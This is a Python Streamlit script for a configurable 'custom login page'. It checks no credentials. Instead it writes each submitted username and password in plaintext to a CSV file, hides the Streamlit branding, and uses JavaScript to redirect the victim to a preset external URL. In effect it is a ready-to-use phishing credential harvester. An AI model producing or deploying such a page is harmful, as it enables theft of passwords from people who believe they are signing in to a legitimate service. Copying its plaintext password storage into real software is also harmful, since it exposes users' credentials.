# streamlit run $0

import streamlit as st
import pandas as pd
from datetime import datetime
import os
import streamlit.components.v1 as components

# ------------------------- CONFIGURABLE PARAMETERS -------------------------
LOGO_PATH = "logo.png"               # Path to the logo file. Use an empty string ("") to disable.
CSV_FILENAME = "logins.csv"          # CSV file to store login data.
REDIRECT_URL = "https://example.com" # Predefined URL to redirect after successful login.

USER_LABEL = "Username"              # Label for the username field.
PASSWORD_LABEL = "Password"          # Label for the password field.
SUBMIT_BUTTON_TEXT = "Login"         # Text for the submit button.
USER_PLACEHOLDER = "Enter your username"      # Placeholder text for the username field.
PASSWORD_PLACEHOLDER = "Enter your password"  # Placeholder text for the password field.

USERNAME_ICON = "👤"                 # Icon for username field. Set to "" to disable.
PASSWORD_ICON = "🔑"                 # Icon for password field. Set to "" to disable.

BACKGROUND_COLOR = "#ffffff"         # Background color of the page.
TEXT_COLOR = "#000000"               # Text color.
BUTTON_BACKGROUND_COLOR = "#008CBA"  # Background color for the submit button.
BUTTON_TEXT_COLOR = "#ffffff"        # Text color for the submit button.

HIDE_STREAMLIT_MENU = True
HIDE_STREAMLIT_FOOTER = True
HIDE_STREAMLIT_HEADER = True

# ------------------------- PAGE CONFIGURATION -------------------------
st.set_page_config(page_title="Custom Login Page", page_icon=":lock:", layout="centered")

# Hide Streamlit default elements and the Deploy button
hide_css = "<style>"
if HIDE_STREAMLIT_MENU:
    hide_css += "#MainMenu {visibility: hidden;}"
if HIDE_STREAMLIT_HEADER:
    hide_css += "header {visibility: hidden;}"
if HIDE_STREAMLIT_FOOTER:
    hide_css += "footer {visibility: hidden;}"
# Hide the deploy button (assumes the deploy button has title "Deploy")
hide_css += 'button[title="Deploy"] {display: none !important;}'
hide_css += "</style>"
st.markdown(hide_css, unsafe_allow_html=True)

# Custom CSS for background, text, and button styling
custom_css = f"""
<style>
    body {{
        background-color: {BACKGROUND_COLOR};
        color: {TEXT_COLOR};
    }}
    .stButton button {{
        background-color: {BUTTON_BACKGROUND_COLOR};
        color: {BUTTON_TEXT_COLOR};
        border: none;
        padding: 0.5em 1em;
        text-align: center;
        text-decoration: none;
        display: inline-block;
        font-size: 1em;
        margin: 0.5em 0;
        cursor: pointer;
    }}
</style>
"""
st.markdown(custom_css, unsafe_allow_html=True)

# ------------------------- DISPLAY LOGO -------------------------
if LOGO_PATH:
    try:
        st.image(LOGO_PATH, width=200)
    except Exception as e:
        st.error("Logo file not found or could not be loaded.")

# ------------------------- LOGIN FORM -------------------------
username_label = f"{USERNAME_ICON} {USER_LABEL}" if USERNAME_ICON else USER_LABEL
password_label = f"{PASSWORD_ICON} {PASSWORD_LABEL}" if PASSWORD_ICON else PASSWORD_LABEL

username = st.text_input(label=username_label, placeholder=USER_PLACEHOLDER)
password = st.text_input(label=password_label, placeholder=PASSWORD_PLACEHOLDER, type="password")

if st.button(SUBMIT_BUTTON_TEXT):
    if username.strip() and password.strip():
        current_datetime = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        login_data = pd.DataFrame({
            "DATETIME": [current_datetime],
            "USER": [username],
            "PASSWORD": [password]
        })
        try:
            header_flag = not os.path.exists(CSV_FILENAME)
            login_data.to_csv(CSV_FILENAME, mode='a', index=False, header=header_flag)
        except Exception as e:
            st.error("An error occurred while saving login data.")
        
        # Redirect using JavaScript with window.top.location.href and a brief timeout
        redirect_html = f"""
            <html>
                <head>
                    <script type="text/javascript">
                        setTimeout(function(){{
                            window.top.location.href = "{REDIRECT_URL}";
                        }}, 100);
                    </script>
                </head>
                <body></body>
            </html>
        """
        components.html(redirect_html, height=0)
    else:
        st.error("Both username and password must be provided.")
